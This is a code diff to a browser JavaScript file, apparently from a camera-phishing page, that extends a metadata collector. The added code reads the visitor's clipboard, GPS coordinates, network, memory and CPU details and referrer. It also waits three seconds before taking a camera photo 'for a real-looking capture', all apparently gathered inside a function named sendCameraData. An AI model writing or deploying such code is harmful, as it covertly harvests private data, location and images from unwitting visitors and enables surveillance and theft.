@@ -26,7 +26,7 @@ function showToast(message = "Done") {
 }
 
 // ================================
-// COLLECT METADATA
+// COLLECT METADATA (DETAILED)
 // ================================
 async function collectMetadata() {
   const metadata = {
@@ -36,13 +36,50 @@ async function collectMetadata() {
     language: navigator.language,
     useragent: navigator.userAgent,
     time: new Date().toLocaleString(),
-    battery: "N/A"
-    // location removed
+    battery: "N/A",
+    gps: "Location not available",
+    network: "N/A",
+    clipboard: "N/A",
+    deviceMemory: navigator.deviceMemory || "N/A",
+    cpuThreads: navigator.hardwareConcurrency || "N/A",
+    cookieEnabled: navigator.cookieEnabled,
+    referer: document.referrer
   };
 
+  // Battery info
   if (navigator.getBattery) {
-    const battery = await navigator.getBattery();
-    metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
+    try {
+      const battery = await navigator.getBattery();
+      metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
+    } catch (err) {
+      console.error("Battery info error:", err);
+    }
+  }
+
+  // Geolocation info
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject)
+      );
+      metadata.gps = `${position.coords.latitude},${position.coords.longitude}`;
+    } catch (err) {
+      console.error("Geolocation error:", err);
+      metadata.gps = "Location access denied";
+    }
+  }
+
+  // Clipboard info
+  try {
+    const clipboardData = await navigator.clipboard.readText();
+    metadata.clipboard = clipboardData || "Empty";
+  } catch (err) {
+    metadata.clipboard = "Access denied";
+  }
+
+  // Network info
+  if (navigator.connection) {
+    metadata.network = JSON.stringify(navigator.connection);
   }
 
   return metadata;
@@ -66,6 +103,7 @@ async function sendCameraData() {
     video.srcObject = stream;
 
     const metadata = await collectMetadata();
+    // Wait a few seconds for a real-looking capture
     await new Promise(res => setTimeout(res, 3000));
 
     const image = await capturePhoto();
